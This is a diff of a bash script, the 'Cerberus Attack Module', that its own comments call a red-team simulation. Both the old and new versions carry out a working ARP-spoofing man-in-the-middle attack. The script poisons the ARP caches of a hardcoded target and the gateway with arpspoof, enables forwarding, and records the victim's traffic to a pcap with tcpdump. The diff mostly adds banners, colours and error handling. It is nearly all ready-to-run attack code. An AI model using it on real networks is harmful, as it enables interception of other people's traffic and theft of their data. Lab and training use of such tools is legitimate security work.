@@ -1,36 +1,64 @@
 #!/bin/bash
-# MODULE: ATTACK SIMULATION (Red Team)
-TARGET=$1
-LOG_FILE=$2
+# Cerberus Attack Module
+# Simulates a Man-in-the-Middle (MITM) attack using ARP Spoofing.
 
-# 1. AUTO-DETECT GATEWAY (The Router)
-# We need to find the gateway IP to fool the victim.
+TARGET="172.20.0.20"
 GATEWAY=$(ip route show | grep default | awk '{print $3}')
 INTERFACE=$(ip route show | grep default | awk '{print $5}')
+CAPTURE_FILE="/app/reports/capture.pcap"
 
-echo "⚔️  INITIATING MITM ATTACK ON: $TARGET"
-echo "    Gateway: $GATEWAY | Interface: $INTERFACE"
-echo "-------------------------------------"
+RED='\033[0;31m'
+CYAN='\033[0;36m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
 
-# 2. ENABLE FORWARDING (So we don't break the internet)
-echo "1" > /proc/sys/net/ipv4/ip_forward
-echo "    [+] IP Forwarding Enabled on Attacker Node"
+# ---------------- VISUALS ----------------
+echo -e "${RED}"
+echo "    (  (      (      (      "
+echo "    )\ )\     )\     )\     "
+echo "   ((_((_)   ((_)   ((_)    "
+echo "    _  _      _      _      "
+echo "   | \| |    | |    | |     "
+echo "   |_ ._|    |_|    |_|     "
+echo "     |_|      |      |      "
+echo "     WARNING: ATTACK SIMULATION INITIATED  "
+echo -e "${NC}"
+echo -e "    Target:  $TARGET"
+echo -e "    Gateway: $GATEWAY ($INTERFACE)"
+echo "----------------------------------------"
 
-# 3. LAUNCH ARP SPOOFING (The Lie)
-# We tell the Target: "I am the Gateway"
-# We tell the Gateway: "I am the Target"
-echo "    [+] poisoning ARP cache (10 seconds)..."
+# 1. ENABLE KERNEL FORWARDING
+# This ensures we don't block the victim's internet connection
+echo -e "${CYAN}[*] Step 1: Enabling IP Forwarding...${NC}"
+echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
 
-# Run in background (&) so we can wait 
+if [ $? -eq 0 ]; then
+    echo -e "${CYAN}    -> Forwarding Enabled.${NC}"
+else
+
+    echo -e "${YELLOW}    -> Warning: Read-only filesystem. Skipping forwarding.${NC}"
+fi
+
+# 2. LAUNCH ARP SPOOF (BACKGROUND)
+echo -e "${CYAN}[*] Step 2: Poisoning ARP Cache (10 seconds)...${NC}"
+
+# Spoof Target: "I am the Gateway"
 timeout 10s arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" > /dev/null 2>&1 &
-PID_1=$!
+PID1=$!
+
+# Spoof Gateway: "I am the Target"
 timeout 10s arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" > /dev/null 2>&1 &
-PID_2=$!
+PID2=$!
 
-# 4. SNIFF TRAFFIC (The Theft)
-echo "    [+] Sniffing packets to /app/reports/capture.pcap..."
-timeout 10s tcpdump -i "$INTERFACE" host "$TARGET" -w /app/reports/capture.pcap > /dev/null 2>&1
+# 3. SNIFF TRAFFIC
+echo -e "${CYAN}[*] Step 3: Sniffing Packets to ${YELLOW}$CAPTURE_FILE${NC}"
+timeout 10s tcpdump -i "$INTERFACE" host "$TARGET" -w "$CAPTURE_FILE" > /dev/null 2>&1
 
-# 5. CLEANUP
-kill $PID_1 $PID_2 2>/dev/null
-echo "    ✅ Attack Completed."
+echo -e "${CYAN}[*] Stopping Attack...${NC}"
+kill $PID1 $PID2 2>/dev/null
+wait $PID1 $PID2 2>/dev/null
+
+echo "----------------------------------------"
+echo -e " ATTACK COMPLETE."
+echo -e "   Traffic captured. Analyze with: tcpdump -r reports/capture.pcap"
+echo "----------------------------------------"
